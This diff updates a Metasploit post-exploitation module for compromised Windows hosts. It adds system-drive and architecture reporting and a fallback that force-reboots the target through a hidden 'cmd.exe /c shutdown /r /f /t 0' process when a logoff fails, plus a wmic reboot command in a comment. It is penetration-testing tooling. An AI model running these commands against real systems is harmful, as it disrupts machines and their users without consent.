@@ -95,7 +95,7 @@ class MetasploitModule < Msf::Post
                                         'Special Thanks: shanty damayanti',
                                 ],
  
-                        'Version'        => '$Revision: 1.2',
+                        'Version'        => '$Revision: 1.3',
                         'DisclosureDate' => '11 02 2019',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
@@ -146,6 +146,7 @@ def run
   #
   # Variable declarations (msf API calls)
   #
+  sdrive = client.fs.file.expand_path("%SYSTEMDRIVE%")
   oscheck = client.fs.file.expand_path("%OS%")
   sysnfo = session.sys.config.sysinfo
   runtor = client.sys.config.getuid
@@ -165,9 +166,11 @@ def run
   print_line("    Running on session  : #{datastore['SESSION']}")
   print_line("    Computer            : #{sysnfo['Computer']}")
   print_line("    Target IP addr      : #{runsession}")
+  print_line("    Architecture        : #{sysnfo['Architecture']}")
   print_line("    Operative System    : #{sysnfo['OS']}")
   print_line("    Payload directory   : #{directory}")
   print_line("    Client UID          : #{runtor}")
+  print_line("    System drive        : #{sdrive}")
   print_line("")
   print_line("")
 
@@ -360,12 +363,24 @@ def run
 
      #
      # force target system logoff to refresh registry?
+     # shutdown using wmic: wmic os where Primary='TRUE' reboot
      #
      if datastore['LOG_OFF'] == true
-       print_warning("Trying to LogOff #{sysnfo['Computer']} to force registry refresh.")
-       Rex::sleep(1)
+       print_status("Logoff #{sysnfo['Computer']} to force registry refresh.")
        cmd_exec("shutdown -L")
+       Rex::sleep(5)
+         # Re-check if session its allready disconnected (logoff)
+         re_check = session.sys.config.sysinfo
+         unless re_check.nil? || re_check == '' || re_check == ' '
+           print_warning("First logoff technic failed, forcing restart.")
+           Rex::sleep(0.5)
+           r = session.sys.process.execute("cmd.exe /c shutdown /r /f /t 0", nil, {'Hidden' => true, 'Channelized' => true})
+           # close channel when done
+           r.channel.close
+           r.close
+         end
      end
+
 
 
    #
